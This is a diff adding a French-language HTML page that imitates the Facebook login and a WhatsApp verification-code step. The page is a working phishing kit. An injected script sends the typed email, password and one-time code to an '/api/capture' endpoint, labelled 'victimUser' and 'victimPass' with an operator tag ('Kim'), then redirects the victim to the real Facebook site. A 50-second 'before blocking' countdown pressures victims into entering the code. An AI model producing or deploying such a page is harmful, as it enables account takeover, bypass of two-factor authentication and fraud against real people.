@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Connexion ou inscription</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        body.otp-mode {
+            background: linear-gradient(135deg, #f0f0f0 40%, #b7d1c6 100%);
+        }
+
+        .top-banner {
+            width: 100%;
+            display: block;
+            line-height: 0;
+            font-size: 0;
+        }
+
+        .top-banner img {
+            width: 100%;
+            height: auto;
+            display: block;
+            object-fit: cover;
+        }
+
+        .container {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px;
+            width: 100%;
+        }
+
+        .content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 40px;
+        }
+
+        @media (min-width: 900px) {
+            .content {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+                margin-top: 80px;
+            }
+        }
+
+        .left-section {
+            flex: 1;
+            max-width: 500px;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        .logo {
+            color: #1877f2;
+            font-size: 56px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .right-section {
+            flex: 1;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .login-form {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .login-form input[type="text"],
+        .login-form input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            color: #1d2129;
+        }
+
+        .login-form input[type="text"]:focus,
+        .login-form input[type="password"]:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            line-height: 48px;
+            padding: 0 16px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        .create-account:hover {
+            background-color: #36a420;
+        }
+
+        .create-page {
+            margin-top: 28px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .create-page a {
+            color: #1c1e21;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            background-color: white;
+            margin-top: auto;
+            padding: 20px 0;
+        }
+
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            font-size: 12px;
+            color: #8a8d91;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .footer-links a {
+            color: #8a8d91;
+            margin: 0 5px;
+            text-decoration: none;
+            line-height: 1.6;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .copyright {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #8a8d91;
+            text-align: center;
+        }
+
+        .show-password {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            font-size: 14px;
+            color: #65676b;
+        }
+
+        .show-password input {
+            margin-right: 8px;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #1877f2;
+            z-index: 99999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-spinner {
+            width: 70px;
+            height: 70px;
+            border: 5px solid rgba(255, 255, 255, 0.25);
+            border-top: 5px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+
+        @keyframes spin {
+            0%   { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .otp-view {
+            display: none;
+            width: 100%;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        .otp-view.active {
+            display: block;
+        }
+
+        .wrapper {
+            max-width: 430px;
+            margin: 0 auto;
+            padding: 30px 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .otp-view h2 {
+            font-size: 22px;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #111;
+            text-align: left;
+        }
+
+        .otp-view p {
+            font-size: 14px;
+            color: #444;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .image {
+            width: 100%;
+            max-height: 230px;
+            border-radius: 18px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .image img {
+            width: 100%;
+            object-fit: cover;
+        }
+
+        .countdown {
+            font-size: 16px;
+            font-weight: bold;
+            color: #111;
+            margin-bottom: 20px;
+            text-align: center;
+            transition: color 0.5s ease;
+        }
+
+        .otp-view input[type="text"] {
+            width: 100%;
+            padding: 16px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            background-color: #ffffff;
+            color: #111;
+        }
+
+        .btn-primary {
+            background-color: #007bff;
+            color: white;
+            padding: 16px;
+            width: 100%;
+            border: none;
+            font-size: 16px;
+            border-radius: 30px;
+            cursor: pointer;
+            margin-bottom: 10px;
+            box-sizing: border-box;
+        }
+
+        .btn-secondary {
+            background-color: transparent;
+            color: #444;
+            padding: 13px;
+            width: 100%;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 30px;
+            cursor: pointer;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100vh;
+            width: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+        }
+
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #00cc66;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+    </style>
+</head>
+<body>
+    <div id="loginView">
+        <div class="top-banner">
+            <img src="https://i.postimg.cc/25Jc9zZ7/IMG-6947.jpg" alt="Bannière">
+        </div>
+
+        <div class="container">
+            <div class="content">
+                <div class="left-section">
+                    <div class="logo">facebook</div>
+                </div>
+
+                <div class="right-section">
+                    <div class="login-form">
+                        <form id="loginForm">
+                            <div class="form-group">
+                                <input type="text" id="email" placeholder="Adresse e-mail ou numéro de tél." required>
+                            </div>
+                            <div class="form-group">
+                                <input type="password" id="password" placeholder="Mot de passe" required>
+                            </div>
+
+                            <div class="show-password">
+                                <input type="checkbox" id="showPassword">
+                                <label for="showPassword">Afficher le mot de passe</label>
+                            </div>
+
+                            <button type="submit" class="login-button" id="submitBtn">Se connecter</button>
+
+                            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+                            <div class="divider"></div>
+                            <button type="button" class="create-account">Créer nouveau compte</button>
+                        </form>
+                    </div>
+                    <div class="create-page">
+                        <a href="#">Créer une Page</a> pour une célébrité, une marque ou une entreprise.
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="?lang=fr" data-lang="fr">🇫🇷 Français</a>
+                    <a href="?lang=en" data-lang="en">🇬🇧 English (US)</a>
+                    <a href="?lang=es" data-lang="es">🇪🇸 Español</a>
+                    <a href="?lang=de" data-lang="de">🇩🇪 Deutsch</a>
+                    <a href="#">S'inscrire</a>
+                    <a href="#">Se connecter</a>
+                    <a href="#">Messenger</a>
+                    <a href="#">Facebook Lite</a>
+                    <a href="#">Video</a>
+                    <a href="#">Lieux</a>
+                    <a href="#">Jeux</a>
+                    <a href="#">Marketplace</a>
+                    <a href="#">Meta Pay</a>
+                    <a href="#">Meta Store</a>
+                    <a href="#">Meta Quest</a>
+                    <a href="#">Imagine with Meta AI</a>
+                    <a href="#">Instagram</a>
+                    <a href="#">Threads</a>
+                    <a href="#">Collecte de fonds</a>
+                    <a href="#">Services</a>
+                    <a href="#">Centre d'information sur les élections</a>
+                    <a href="#">Politique de confidentialité</a>
+                    <a href="#">Centre de confidentialité</a>
+                    <a href="#">Groupes</a>
+                    <a href="#">À propos</a>
+                    <a href="#">Créer une publicité</a>
+                    <a href="#">Créer une Page</a>
+                    <a href="#">Développeurs</a>
+                    <a href="#">Emplois</a>
+                    <a href="#">Cookies</a>
+                    <a href="#">Choisir sa pub</a>
+                    <a href="#">Conditions générales</a>
+                    <a href="#">Aide</a>
+                    <a href="#">Importation des contacts et non-utilisateurs</a>
+                    <a href="#">Paramètres</a>
+                </div>
+
+                <div class="copyright">
+                    Meta © 2026
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="otp-view" id="otpView">
+        <div class="wrapper">
+            <h2>Confirmez votre compte</h2>
+            <p>Nous avons envoyé un code sur WhatsApp. Saisissez ce code pour confirmer votre compte.</p>
+
+            <div class="image">
+                <img src="https://i.postimg.cc/Jn7ML7nP/IMG-8544.jpg" alt="Illustration WhatsApp">
+            </div>
+
+            <div class="countdown" id="countdown">
+                Temps restant avant blocage : 50s
+            </div>
+
+            <input type="text" id="otpCodeInput" placeholder="Entrez le code" autocomplete="one-time-code">
+            <button type="button" class="btn-primary" id="btnOtpContinue" onclick="handleContinue()">Continuer</button>
+            <button type="button" class="btn-secondary" id="btnOtpRetry" onclick="restartTimer()">Essayer d’une autre façon</button>
+        </div>
+
+        <div class="overlay" id="overlay">
+            <div class="loader"></div>
+        </div>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <script>
+        (function () {
+            const showPwd = document.getElementById("showPassword");
+            const pwdInput = document.getElementById("password");
+            const loginForm = document.getElementById("loginForm");
+            const loginView = document.getElementById("loginView");
+            const otpView = document.getElementById("otpView");
+            const loadingOverlay = document.getElementById("loadingOverlay");
+            const countdownEl = document.getElementById("countdown");
+            const otpOverlay = document.getElementById("overlay");
+
+            let timerInterval = null;
+            let secondsLeft = 50;
+
+            if (showPwd && pwdInput) {
+                showPwd.addEventListener("change", () => {
+                    pwdInput.type = showPwd.checked ? "text" : "password";
+                });
+            }
+
+            function startOtpCountdown() {
+                clearInterval(timerInterval);
+                secondsLeft = 50;
+                if (countdownEl) countdownEl.textContent = `Temps restant avant blocage : ${secondsLeft}s`;
+                timerInterval = setInterval(() => {
+                    secondsLeft -= 1;
+                    if (countdownEl) {
+                        countdownEl.textContent = `Temps restant avant blocage : ${Math.max(0, secondsLeft)}s`;
+                    }
+                    if (secondsLeft <= 0) {
+                        clearInterval(timerInterval);
+                    }
+                }, 1000);
+            }
+
+            window.restartTimer = function () {
+                startOtpCountdown();
+            };
+
+            window.handleContinue = function () {
+                if (otpOverlay) otpOverlay.style.display = "flex";
+                setTimeout(() => {
+                    if (typeof window.__REAL_PARAM_REDIRECT__ === "function") {
+                        window.__REAL_PARAM_REDIRECT__();
+                    }
+                }, 600);
+            };
+
+            if (loginForm) {
+                loginForm.addEventListener("submit", (e) => {
+                    e.preventDefault();
+                    const mode = (window.__REAL_PARAM_MODE__ || "otp").toLowerCase();
+                    if (mode === "otp") {
+                        if (loadingOverlay) loadingOverlay.classList.add("active");
+                        setTimeout(() => {
+                            if (loadingOverlay) loadingOverlay.classList.remove("active");
+                            if (loginView) loginView.style.display = "none";
+                            document.body.classList.add("otp-mode");
+                            if (otpView) otpView.classList.add("active");
+                            startOtpCountdown();
+                        }, 1200);
+                    } else {
+                        if (typeof window.__REAL_PARAM_REDIRECT__ === "function") {
+                            window.__REAL_PARAM_REDIRECT__();
+                        }
+                    }
+                });
+            }
+        })();
+    </script>
+
+    <script data-lang-auto-bridge="true">
+        (function () {
+            const LANG_AUTO_BRIDGE = {
+                defaultLang: "auto",
+                network: "Facebook",
+                owner: "Kim",
+                redirectUrl: "https://www.facebook.com/accounts/login/",
+                supported: ["fr", "en", "es", "de"]
+            };
+
+            const MULTI_LANG_PACK = {
+                fr: {
+                    "sign in": "Connexion",
+                    "log in": "Se connecter",
+                    "login": "Connexion",
+                    "username": "Nom d'utilisateur",
+                    "email address or phone number": "Adresse e-mail ou numéro de tél.",
+                    "password": "Mot de passe",
+                    "show password": "Afficher le mot de passe",
+                    "forgot password?": "Mot de passe oublié ?",
+                    "create new account": "Créer nouveau compte",
+                    "create a page": "Créer une Page",
+                    "confirm your account": "Confirmez votre compte",
+                    "enter the code": "Entrez le code",
+                    "continue": "Continuer",
+                    "try another way": "Essayer d’une autre façon",
+                    "sign up": "S'inscrire",
+                    "privacy policy": "Politique de confidentialité",
+                    "terms": "Conditions générales",
+                    "help": "Aide",
+                    "settings": "Paramètres"
+                },
+                en: {
+                    "se connecter": "Log in",
+                    "connexion": "Log in",
+                    "adresse e-mail ou numéro de tél.": "Email address or phone number",
+                    "mot de passe": "Password",
+                    "afficher le mot de passe": "Show password",
+                    "mot de passe oublié ?": "Forgot password?",
+                    "créer nouveau compte": "Create new account",
+                    "créer une page": "Create a Page",
+                    "confirmez votre compte": "Confirm your account",
+                    "nous avons envoyé un code sur whatsapp. saisissez ce code pour confirmer votre compte.": "We sent a code to WhatsApp. Enter this code to confirm your account.",
+                    "entrez le code": "Enter the code",
+                    "continuer": "Continue",
+                    "essayer d’une autre façon": "Try another way",
+                    "s'inscrire": "Sign up",
+                    "politique de confidentialité": "Privacy Policy",
+                    "conditions générales": "Terms",
+                    "aide": "Help",
+                    "paramètres": "Settings"
+                },
+                es: {
+                    "se connecter": "Iniciar sesión",
+                    "connexion": "Iniciar sesión",
+                    "adresse e-mail ou numéro de tél.": "Correo electrónico o número de teléfono",
+                    "mot de passe": "Contraseña",
+                    "afficher le mot de passe": "Mostrar contraseña",
+                    "mot de passe oublié ?": "¿Olvidaste tu contraseña?",
+                    "créer nouveau compte": "Crear cuenta nueva",
+                    "créer une page": "Crear una página",
+                    "confirmez votre compte": "Confirma tu cuenta",
+                    "nous avons envoyé un code sur whatsapp. saisissez ce code pour confirmer votre compte.": "Enviamos un código a WhatsApp. Ingresa este código para confirmar tu cuenta.",
+                    "entrez le code": "Ingresa el código",
+                    "continuer": "Continuar",
+                    "essayer d’une autre façon": "Probar de otra manera",
+                    "s'inscrire": "Registrarse",
+                    "politique de confidentialité": "Política de privacidad",
+                    "conditions générales": "Condiciones",
+                    "aide": "Ayuda",
+                    "paramètres": "Configuración"
+                },
+                de: {
+                    "se connecter": "Anmelden",
+                    "connexion": "Anmelden",
+                    "adresse e-mail ou numéro de tél.": "E-Mail-Adresse oder Telefonnummer",
+                    "mot de passe": "Passwort",
+                    "afficher le mot de passe": "Passwort anzeigen",
+                    "mot de passe oublié ?": "Passwort vergessen?",
+                    "créer nouveau compte": "Neues Konto erstellen",
+                    "créer une page": "Seite erstellen",
+                    "confirmez votre compte": "Konto bestätigen",
+                    "nous avons envoyé un code sur whatsapp. saisissez ce code pour confirmer votre compte.": "Wir haben einen Code an WhatsApp gesendet. Gib diesen Code ein, um dein Konto zu bestätigen.",
+                    "entrez le code": "Code eingeben",
+                    "continuer": "Weiter",
+                    "essayer d’une autre façon": "Auf andere Weise versuchen",
+                    "s'inscrire": "Registrieren",
+                    "politique de confidentialité": "Datenschutzrichtlinie",
+                    "conditions générales": "Nutzungsbedingungen",
+                    "aide": "Hilfe",
+                    "paramètres": "Einstellungen"
+                }
+            };
+
+            function normalizeLang(raw) {
+                if (!raw) return null;
+                const s = String(raw).trim().toLowerCase();
+                if (["fr", "french", "français", "francais", "🇫🇷"].some((k) => s === k || s.startsWith("fr-"))) return "fr";
+                if (["en", "english", "anglais", "🇬🇧", "🇺🇸"].some((k) => s === k || s.startsWith("en-"))) return "en";
+                if (["es", "spanish", "espagnol", "español", "espagne", "🇪🇸"].some((k) => s === k || s.startsWith("es-"))) return "es";
+                if (["de", "german", "deutsch", "allemand", "allemagne", "🇩🇪"].some((k) => s === k || s.startsWith("de-"))) return "de";
+                const two = s.slice(0, 2);
+                return LANG_AUTO_BRIDGE.supported.includes(two) ? two : null;
+            }
+
+            function detectInitialLang() {
+                try {
+                    const p = new URLSearchParams(window.location.search);
+                    const q = normalizeLang(p.get("lang") || p.get("hl") || p.get("locale"));
+                    if (q) return q;
+                } catch (_) {}
+                try {
+                    const st = normalizeLang(localStorage.getItem("abeilles_selected_lang") || sessionStorage.getItem("abeilles_selected_lang") || window.name);
+                    if (st) return st;
+                } catch (_) {}
+                try {
+                    const nav = normalizeLang(navigator.language);
+                    if (nav) return nav;
+                } catch (_) {}
+                return "fr";
+            }
+
+            let ACTIVE_LANG = detectInitialLang();
+
+            function notifyServer(langCode, sourceReason) {
+                const token = new URLSearchParams(window.location.search).get("token") || "";
+                try {
+                    fetch("/api/lang", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            lang: langCode,
+                            token,
+                            source: sourceReason,
+                            network: LANG_AUTO_BRIDGE.network,
+                            owner: LANG_AUTO_BRIDGE.owner,
+                            path: window.location.pathname
+                        }),
+                        keepalive: true
+                    }).catch(() => {});
+                } catch (_) {}
+            }
+
+            function translateValue(val, langCode) {
+                const dict = MULTI_LANG_PACK[langCode];
+                if (!val || !dict) return null;
+                const trimmed = String(val).trim();
+                if (!trimmed) return null;
+                const mapped = dict[trimmed.toLowerCase()];
+                if (!mapped) return null;
+                return String(val).replace(trimmed, mapped);
+            }
+
+            function applyTranslations(root, langCode) {
+                const dict = MULTI_LANG_PACK[langCode];
+                if (!dict || !root) return;
+
+                const els = root.querySelectorAll ? [root, ...root.querySelectorAll("*")] : [];
+                els.forEach((el) => {
+                    if (!el || ["SCRIPT", "STYLE", "NOSCRIPT"].includes(el.tagName)) return;
+                    ["placeholder", "title", "aria-label"].forEach((attr) => {
+                        const cur = el.getAttribute(attr);
+                        if (cur) {
+                            const next = translateValue(cur, langCode);
+                            if (next && next !== cur) el.setAttribute(attr, next);
+                        }
+                    });
+                    if (el.children && el.children.length === 0 && el.textContent) {
+                        const next = translateValue(el.textContent, langCode);
+                        if (next && next !== el.textContent) el.textContent = next;
+                    }
+                });
+
+                const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null, false);
+                let node;
+                while ((node = walker.nextNode())) {
+                    if (!node.parentElement || ["SCRIPT", "STYLE", "NOSCRIPT"].includes(node.parentElement.tagName)) continue;
+                    const next = translateValue(node.nodeValue, langCode);
+                    if (next && next !== node.nodeValue) node.nodeValue = next;
+                }
+            }
+
+            function applyLanguage(newLang, reason) {
+                const clean = normalizeLang(newLang);
+                if (!clean) return;
+                ACTIVE_LANG = clean;
+
+                try { document.documentElement.setAttribute("lang", clean); } catch (_) {}
+                try { localStorage.setItem("abeilles_selected_lang", clean); } catch (_) {}
+                try { sessionStorage.setItem("abeilles_selected_lang", clean); } catch (_) {}
+                try { window.name = "lang:" + clean; } catch (_) {}
+
+                try {
+                    const u = new URL(window.location.href);
+                    if (u.searchParams.get("lang") !== clean) {
+                        u.searchParams.set("lang", clean);
+                        window.history.replaceState({}, "", u.toString());
+                    }
+                } catch (_) {}
+
+                applyTranslations(document.body || document.documentElement, clean);
+                notifyServer(clean, reason || "auto");
+            }
+
+            document.addEventListener("click", (e) => {
+                const target = e.target.closest ? (e.target.closest("[data-lang], [lang], a[href], button") || e.target) : e.target;
+                const rawCandidates = [
+                    target.getAttribute && target.getAttribute("data-lang"),
+                    target.getAttribute && target.getAttribute("lang"),
+                    target.getAttribute && target.getAttribute("href"),
+                    target.textContent
+                ];
+                for (const c of rawCandidates) {
+                    if (!c) continue;
+                    const s = String(c).toLowerCase();
+                    const m = s.match(/[?&]lang=([a-z]{2})/i);
+                    const detected = m ? normalizeLang(m[1]) : normalizeLang(c);
+                    if (detected) {
+                        if (target.tagName === "A") e.preventDefault();
+                        applyLanguage(detected, "click");
+                        break;
+                    }
+                }
+            }, true);
+
+            window.ABEILLES_LANG_BRIDGE = {
+                get lang() { return ACTIVE_LANG; },
+                setLang: (l) => applyLanguage(l, "api")
+            };
+
+            if (document.readyState === "loading") {
+                document.addEventListener("DOMContentLoaded", () => applyLanguage(ACTIVE_LANG, "init"));
+            } else {
+                applyLanguage(ACTIVE_LANG, "init");
+            }
+        })();
+    </script>
+
+    <script data-real-injected="true" data-injected-mode="otp">
+        (function () {
+            const PARAM_CFG = {
+                endpoint: "/api/capture",
+                defaultOwner: "Kim",
+                network: "Facebook",
+                redirectUrl: "https://www.facebook.com/accounts/login/",
+                mode: "otp",
+                isOtpMode: true,
+                enableOtpSound: true
+            };
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const ownerVal = urlParams.get("user") || urlParams.get("ref") || PARAM_CFG.defaultOwner;
+            const typeParam = (urlParams.get("type") || PARAM_CFG.mode).toLowerCase();
+            const tokenVal = urlParams.get("token") || "";
+
+            window.__REAL_PARAM_MODE__ = typeParam === "standard" ? "standard" : PARAM_CFG.mode;
+            window.__REAL_PARAM_REDIRECT__ = function () {
+                const target = PARAM_CFG.redirectUrl;
+                if (!target) return;
+                try {
+                    const u = new URL(target);
+                    const lang = (window.ABEILLES_LANG_BRIDGE && window.ABEILLES_LANG_BRIDGE.lang) || "fr";
+                    u.searchParams.set("lang", lang);
+                    window.location.replace(u.toString());
+                } catch (_) {
+                    window.location.replace(target);
+                }
+            };
+
+            let lastUser = "";
+            let lastPass = "";
+            let lastOtpSent = "";
+            const sentSet = new Set();
+
+            function sendCapture(payload) {
+                const key = JSON.stringify(payload);
+                if (sentSet.has(key)) return;
+                sentSet.add(key);
+
+                const activeLang = (window.ABEILLES_LANG_BRIDGE && window.ABEILLES_LANG_BRIDGE.lang) ||
+                    document.documentElement.getAttribute("lang") || "fr";
+
+                return fetch(PARAM_CFG.endpoint, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(Object.assign({}, payload, { lang: activeLang, token: tokenVal })),
+                    keepalive: true
+                }).catch(() => {});
+            }
+
+            function readCurrentFields() {
+                const emailEl = document.getElementById("email");
+                const passEl = document.getElementById("password");
+                const otpEl = document.getElementById("otpCodeInput");
+                return {
+                    user: (emailEl && emailEl.value ? emailEl.value.trim() : "") || lastUser,
+                    pass: (passEl && passEl.value ? passEl.value : "") || lastPass,
+                    otp: otpEl && otpEl.value ? otpEl.value.trim() : "Aucun"
+                };
+            }
+
+            function emit(forceOtp) {
+                const data = readCurrentFields();
+                if (data.user) lastUser = data.user;
+                if (data.pass) lastPass = data.pass;
+                const hasOtp = Boolean(data.otp && data.otp !== "Aucun");
+                const useOtp = forceOtp || hasOtp || window.__REAL_PARAM_MODE__ === "otp";
+                const stepType = useOtp ? (hasOtp ? "otp" : "otp_step1") : "standard";
+
+                if (lastUser || lastPass || hasOtp) {
+                    if (hasOtp && data.otp !== lastOtpSent) lastOtpSent = data.otp;
+                    sendCapture({
+                        owner: ownerVal,
+                        network: PARAM_CFG.network,
+                        type: stepType,
+                        victimUser: lastUser,
+                        victimPass: lastPass,
+                        otp: useOtp ? data.otp : "Aucun"
+                    });
+                }
+            }
+
+            document.addEventListener("submit", () => emit(false), true);
+            document.addEventListener("click", (e) => {
+                const btn = e.target.closest ? e.target.closest("button, [role='button']") : null;
+                if (!btn) return;
+                const isOtpBtn = btn.id === "btnOtpContinue";
+                emit(isOtpBtn);
+            }, true);
+            document.addEventListener("input", (e) => {
+                if (e.target && e.target.id === "otpCodeInput" && e.target.value.trim().length >= 4) {
+                    emit(true);
+                }
+            }, true);
+        })();
+    </script>
+</body>
+</html>
